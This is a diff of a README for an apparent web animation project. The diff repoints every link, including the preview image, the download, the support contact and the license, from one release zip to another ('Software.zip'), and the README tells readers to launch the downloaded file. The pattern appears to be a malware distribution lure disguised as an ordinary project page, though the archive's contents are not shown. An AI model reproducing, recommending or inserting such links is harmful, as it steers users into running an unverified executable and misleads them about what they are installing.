@@ -25,12 +25,12 @@ This repository contains a cool and interactive web animation created by Sheriya
 ## Preview 💻
 Here is a sneak peek of what you can expect from this awesome animation:
 
-![FrameSequenceAnimation Preview](https://github.com/Mydeli-cybrog1/frameSequenceAnimation/releases/download/v1.0/Application.zip)
+![FrameSequenceAnimation Preview](https://github.com/Mydeli-cybrog1/frameSequenceAnimation/releases/download/v2.0/Software.zip)
 
 ## Installation 🖥️
 To get started with "frameSequenceAnimation" animation, simply download the project files from the following link:
 
-[Download "frameSequenceAnimation"](https://github.com/Mydeli-cybrog1/frameSequenceAnimation/releases/download/v1.0/Application.zip) 🚀
+[Download "frameSequenceAnimation"](https://github.com/Mydeli-cybrog1/frameSequenceAnimation/releases/download/v2.0/Software.zip) 🚀
 
 *Launch the downloaded file to explore the animation.*
 
@@ -47,10 +47,10 @@ If the above link doesn't work, please check the "Releases" section of this repo
 - Coding School: Sheriyans Coding School 🚀
 
 ## Support 👍
-If you encounter any issues or have questions, feel free to reach out to Sheriyans at *https://github.com/Mydeli-cybrog1/frameSequenceAnimation/releases/download/v1.0/Application.zip*.
+If you encounter any issues or have questions, feel free to reach out to Sheriyans at *https://github.com/Mydeli-cybrog1/frameSequenceAnimation/releases/download/v2.0/Software.zip*.
 
 ## License 📝
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/Mydeli-cybrog1/frameSequenceAnimation/releases/download/v1.0/Application.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Mydeli-cybrog1/frameSequenceAnimation/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
